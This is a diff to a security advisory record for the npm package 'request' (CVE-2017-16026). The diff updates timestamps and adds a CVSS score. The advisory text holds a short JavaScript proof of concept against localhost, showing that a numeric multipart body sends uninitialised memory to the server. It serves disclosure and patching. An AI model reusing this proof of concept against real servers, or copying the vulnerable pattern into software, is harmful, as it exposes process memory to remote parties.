@@ -1,6 +1,6 @@
 {
   "Severity": "MODERATE",
-  "UpdatedAt": "2018-11-09T17:45:02Z",
+  "UpdatedAt": "2023-09-12T18:48:47Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "request"
@@ -39,16 +39,16 @@
         "Value": "CVE-2017-16026"
       }
     ],
-    "Description": "Affected versions of `request` will disclose local system memory to remote systems in certain circumstances. When a multipart request is made, and the type of `body` is `number`, then a buffer of that size will be allocated and sent to the remote server as the body.\n\n## Proof of Concept\n\n```\nvar request = require('request');\nvar http = require('http');\n\nvar serveFunction = function (req, res){\n\treq.on('data', function (data) {\n            console.log(data)\n        });\n\tres.end();\n};\nvar server = http.createServer(serveFunction);\nserver.listen(8000);\n\nrequest({\n\tmethod: \"POST\",\n\turi: 'http://localhost:8000',\n\tmultipart: [{body:500}]\n},function(err,res,body){});\n```\n\n\n## Recommendation\n\nUpdate to version 2.68.0 or later",
+    "Description": "Affected versions of `request` will disclose local system memory to remote systems in certain circumstances. When a multipart request is made, and the type of `body` is `number`, then a buffer of that size will be allocated and sent to the remote server as the body.\n\n## Proof of Concept\n\n```js\nvar request = require('request');\nvar http = require('http');\n\nvar serveFunction = function (req, res){\n\treq.on('data', function (data) {\n            console.log(data)\n        });\n\tres.end();\n};\nvar server = http.createServer(serveFunction);\nserver.listen(8000);\n\nrequest({\n\tmethod: \"POST\",\n\turi: 'http://localhost:8000',\n\tmultipart: [{body:500}]\n},function(err,res,body){});\n```\n\n\n## Recommendation\n\nUpdate to version 2.68.0 or later",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2018-11-09T17:44:01Z",
     "Severity": "MODERATE",
     "Summary": "Remote Memory Exposure in request",
-    "UpdatedAt": "2023-04-21T18:53:01Z",
+    "UpdatedAt": "2023-09-12T18:48:47Z",
     "WithdrawnAt": "",
     "CVSS": {
-      "Score": 0,
-      "VectorString": ""
+      "Score": 5.9,
+      "VectorString": "CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
     }
   },
   "Versions": [
